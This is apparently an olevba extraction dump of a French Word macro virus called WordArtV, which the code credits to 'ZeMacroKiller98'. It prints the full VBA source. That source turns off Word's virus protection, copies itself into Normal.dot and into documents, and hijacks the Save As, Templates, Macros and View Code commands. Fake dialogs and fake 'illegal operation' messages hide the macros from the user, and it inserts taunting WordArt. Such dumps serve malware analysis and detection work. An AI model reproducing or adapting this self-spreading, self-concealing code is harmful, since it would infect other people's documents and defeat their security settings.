olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordArtv.bas 
in file: Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733 - OLE stream: 'Macros/VBA/WordArtv'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "WordArtV" Then
        bInstalled = -1
    End If
Next i
If Not bInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="WordArtV", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
    StatusBar = "Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "       Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "               Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                       Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                               Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                       Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                               Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                       Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                               Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                       Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                               Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                       Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                               Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                       Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                               Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                       Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                               Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                                       Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                                               Vous allez connaоtre WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="WordArtV", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
Dim Valeur, Taille, Choix
Randomize
Valeur = Int(Rnd * 10) + 1
Taille = Int(Rnd * 100) + 20
Choix = Int(Rnd * 10) + 1
L$ = Int(Rnd * 250) + 1
T$ = Int(Rnd + 350) + 1
If Valeur = 1 Then
    a$ = msoTextEffect26
End If
If Valeur = 2 Then
    a = msoTextEffect13
End If
If Valeur = 3 Then
    a$ = msoTextEffect19
End If
If Valeur = 4 Then
    a$ = msoTextEffect8
End If
If Valeur = 5 Then
    a$ = msoTextEffect5
End If
If Valeur = 6 Then
    a$ = msoTextEffect16
End If
If Valeur = 7 Then
    a$ = msoTextEffect26
End If
If Valeur = 8 Then
    a$ = msoTextEffect2
End If
If Valeur = 9 Then
    a$ = msoTextEffect19
End If
If Valeur = 10 Then
    a$ = msoTextEffect29
End If
If (Choix = 1) Or (Choix = 3) Or (Choix = 5) Then
ActiveDocument.Shapes.AddTextEffect PresetTextEffect:=a$, Text:="ZeMacroKiller98", FontName:="Impact", FontSize:=Taille, FontBold:=msoFalse, FontItalic:=msoFalse, Left:=L$, Top:=T$
MsgBox "ZeMacroKiller98 est avec vous...", vbExclamation, "WordArtV"
End If
If (Choix = 2) Or (Choix = 4) Or (Choix = 6) Then
ActiveDocument.Shapes.AddTextEffect PresetTextEffect:=a$, Text:="ZeMacroKiller98", FontName:="Impact", FontSize:=Taille, FontBold:=msoFalse, FontItalic:=msoFalse, Left:=L$, Top:=T$
MsgBox "WordArtV vous a contaminй...", vbExclamation, "ZeMacroKiller98"
End If
If (Choix = 1) Or (Choix = 3) Or (Choix = 5) Then
MsgBox "ZeMacroKiller98 et WordArtV vous remercie...", vbInformation, "HAHAHAHAHA!"
End If
ActiveDocument.Save
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    UserForm900.Show
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    UserForm999.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a rйalisй une opйrartion illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm900.frm 
in file: Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733 - OLE stream: 'Macros/VBA/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub CommandButton1_Click()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton2_Click()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton6_Click()
Unload UserForm900
End Sub

Private Sub UserForm_Initialize()
    TextBox1.Text = NormalTemplate.Name
    CommandButton2.Enabled = False
    CommandButton3.Enabled = False
    CommandButton4.Enabled = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm999.frm 
in file: Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733 - OLE stream: 'Macros/VBA/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








Private Sub ListBox1_Click()
    If ListBox1.Selected(0) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    ElseIf ListBox1.Selected(1) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    Else
        CommandButton1.Enabled = False
        CommandButton3.Enabled = False
        CommandButton4.Enabled = False
        CommandButton6.Enabled = False
    End If
End Sub

Private Sub UserForm_Initialize()
    ComboBox1.AddItem "Commande Word"
    ComboBox1.AddItem "Tous les modиles actifs"
    ComboBox1.AddItem "Normal.dot (modиle global)"
    ComboBox1.AddItem WordBasic.WindowName$()
    CommandButton1.Enabled = False
    CommandButton3.Enabled = False
    TextBox2.Text = "Macro crййe le " & Date & " par " & Application.UserName
End Sub

Private Sub CommandButton1_Click()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub CommandButton2_Click()
Unload UserForm999
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton6_Click()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton7_Click()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub ScrollBar1_Change()
MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�le de documentX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mise � jour automatique des styles de document
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�les globaux et compl�ments
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Les �l�ments coch�s sont d�j� en m�moire.ume�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Attacher....D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ajouter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Chemin d'acc�s:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialox1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tous les mod�les actifs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialox1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom de la macro:0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialox1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros disponibles dans::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialox1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialox1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialox1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ex�cuter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annulerr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialerr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ex�cuter pas � pas
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialerr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Modifier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cr�erier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arialier
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Tous les mod\xe8les actifs'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Intended.Art-26af50fdb74b7bf746787e0ad03bd7b15ff05733' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
